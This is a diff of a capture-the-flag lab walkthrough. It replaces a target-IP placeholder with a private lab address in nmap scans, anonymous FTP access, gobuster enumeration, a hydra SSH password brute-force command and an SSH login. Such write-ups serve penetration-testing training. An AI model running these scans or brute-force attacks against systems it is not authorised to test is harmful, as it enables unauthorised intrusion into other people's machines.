@@ -9,8 +9,8 @@ Linux machine combining FTP anonymous access, steganography, SSH brute force, an
 ### Network Scanning
 
 ```bash
-nmap -p- -Pn <target_ip>
-nmap -sC -sV -p21,22,80 <target_ip>
+nmap -p- -Pn 10.65.159.83
+nmap -sC -sV -p21,22,80 10.65.159.83
 ```
 
 Open ports:
@@ -22,7 +22,7 @@ Open ports:
 ### FTP Enumeration
 
 ```bash
-ftp <target_ip>
+ftp 10.65.159.83
 # username: anonymous
 # password: [blank]
 ```
@@ -54,7 +54,7 @@ Output: a password list for subsequent brute force.
 ### Web Enumeration
 
 ```bash
-gobuster dir -u http://<target_ip>/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 20
+gobuster dir -u http://10.65.159.83/ -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 20
 ```
 
 Web enumeration confirmed username and supplementary path information.
@@ -68,13 +68,13 @@ Web enumeration confirmed username and supplementary path information.
 Using the password list extracted from the stego step:
 
 ```bash
-hydra -l <username> -P <passwords.txt> ssh://<target_ip>
+hydra -l <username> -P <passwords.txt> ssh://10.65.159.83
 ```
 
 Valid credentials recovered. SSH access:
 
 ```bash
-ssh <user>@<target_ip>
+ssh <user>@10.65.159.83
 cat user.txt
 ```
 
